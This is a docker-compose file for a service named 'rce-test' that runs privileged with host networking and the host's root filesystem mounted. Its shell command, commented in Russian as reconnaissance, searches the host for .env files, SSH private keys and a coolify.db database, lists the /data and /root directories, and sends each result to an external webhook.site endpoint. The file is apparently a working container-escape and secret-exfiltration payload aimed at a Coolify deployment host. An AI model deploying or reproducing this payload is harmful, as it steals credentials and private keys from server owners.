version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl findutils
        # Разведка: ищем все .env файлы
        find /host-root -name ".env" -type f 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_files
        
        # Ищем все id_rsa (SSH ключи)
        find /host-root -name "id_rsa" -type f 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=ssh_keys
        
        # Ищем coolify.db (база данных)
        find /host-root -name "coolify.db" -type f 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_db
        
        # Смотрим структуру /host-root/data (если есть)
        ls -la /host-root/data/ 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=data_dir
        
        # Смотрим структуру /host-root/root
        ls -la /host-root/root/ 2>/dev/null | curl -X POST -d @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=root_dir
        
        sleep 3600
